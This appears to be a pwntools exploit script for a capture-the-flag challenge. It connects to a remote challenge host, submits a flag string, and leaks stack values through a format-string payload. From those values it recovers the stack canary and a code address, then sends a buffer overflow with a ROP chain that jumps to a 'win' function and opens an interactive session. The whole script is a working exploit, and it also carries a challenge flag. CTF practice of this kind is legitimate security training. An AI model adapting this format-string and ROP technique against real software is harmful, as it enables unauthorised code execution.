from pwn import *

p = remote("hax1.allesctf.net",9101)


p.readline()
p.sendline("CSCG{NOW_PRACTICE_MORE}") # Format string exploit
p.readline()

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

cookie =    int(leaks[38],16) # get the stack cookie
leak_addr = int(leaks[40],16) # get the leaked return address

ret = leak_addr - 0x38 # calculate the address of an ret instruction

win = leak_addr - 0x231 # calculate the address of WINgardium_leviosa


p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(cookie) +
        p64(ret) + p64(ret) + p64(win))

p.interactive()
